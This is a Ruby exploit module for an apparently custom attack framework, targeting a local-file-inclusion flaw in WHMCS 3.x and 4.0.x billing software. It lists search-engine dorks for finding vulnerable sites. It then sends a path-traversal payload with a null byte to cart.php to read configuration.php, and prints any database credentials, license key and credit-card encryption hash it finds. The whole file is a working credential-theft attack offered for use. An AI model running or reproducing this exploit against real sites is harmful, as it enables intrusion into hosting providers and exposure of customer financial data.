# WHMCompleteSolution (WHMCS) LFD/LFI Check
#
# Affected Versions: 3.x.x , 4.0.x
# DORK: "client/cart.php?a=login"
# DORK: inurl:/cart.php?a=login&templatefile=login
# DORK: inutl:/cart.php?a=add&templatefile=configureproductdomain

class WhmcsLfiChk < Core::CoreShell
	def initialize
		#Basic Info:
		module_name='WHMCS-LFI'
		module_info={
			'Name'        => 'WHMCS 3.x.x & 4.0.x LFI Module',
			'Version'     => 'v0.01b',
			'Description' => "Checks for the cart.php LFI Vulnerability using widely known configuration.php as check. If found, the db credentials are captured & presented...\n\n\tTarget => Should point up to the cart.php or equivelant vuln file",
			'Author'      => 'Hood3dRob1n'
		}

		module_required={ 'Target' => "http://www.hostingsite.com.au/accounts/cart.php" } 
		module_optional={ 'ProxyIp' => 'nil', 'ProxyPort' => 'nil', 'Username' => 'nil', 'Password' => 'nil' } 

		@non_set_private_options={ 'Auth' => 0, 'Cookie' => 'nil' }

		if $module_name.nil?
			pluginRegistrar(module_name,module_info,module_required,module_optional)
		else
			whmcslfi
		end
	end

	def whmcslfi
		#Initialize our Http::EasyCurb request object with any special values needed, otherwise mark them to nil....
		http = Http::EasyCurb.new(@non_set_private_options['Cookie'],@non_set_private_options['Auth'],$module_optional['ProxyIp'],$module_optional['ProxyPort'],$module_optional['Username'],$module_optional['Password'])

		foo=randz(7)
		payload="?a=#{foo}&templatefile=../../../configuration.php%00"
		target = "#{$module_required['Target']}#{payload}"
		body = http._get(target)

		#These items will show up if vuln, otherwise not so likely :p
		if body[0] =~ /license=\"(.+)\"/
			license = $1
		end
		if body[0] =~ /db_host = \"(.+)\"/
			db_host = $1
		end
		if body[0] =~ /db_username = \"(.+)\"/
			db_username = $1
		end
		if body[0] =~ /db_password = \"(.+)\"/
			db_passwd = $1
		end
		if body[0] =~ /db_name = \"(.+)\"/
			db_name = $1
		end
		if body[0]  =~ /cc_encryption_hash = \"(.+)\"/
			cc_encryption = $1
		end

		#IF we found the main 2 then go ahead and present the results to our user....
		if not db_host.nil? and not db_username.nil?
			puts "[".light_green + "*".white + "] Confirmed Site is Vulnerable".light_green + "!".white
			puts "[".light_green + "*".white + "] DB Details: ".light_green
			puts "[".light_green + "*".white + "] DB Host: ".light_green + "#{db_host}".white if not db_host.nil?
			puts "[".light_green + "*".white + "] DB Username: ".light_green + "#{db_username}".white if not db_username.nil?
			puts "[".light_green + "*".white + "] DB Password: ".light_green + "#{db_passwd}".white if not db_passwd.nil?
			puts "[".light_green + "*".white + "] DB Name: ".light_green + "#{db_name}".white if not db_name.nil?
			puts "[".light_green + "*".white + "] WHMCS License: ".light_green + "#{license}".white if not license.nil?
			puts "[".light_green + "*".white + "] CC Encryption Hash: ".light_green + "#{cc_encryption}".white if not cc_encryption.nil?
		else
			puts "[".light_red + "X".white + "] Site doesn't appear to be vulnerable ".light_red  + "!".white
		end
	end
end

WhmcsLfiChk.new
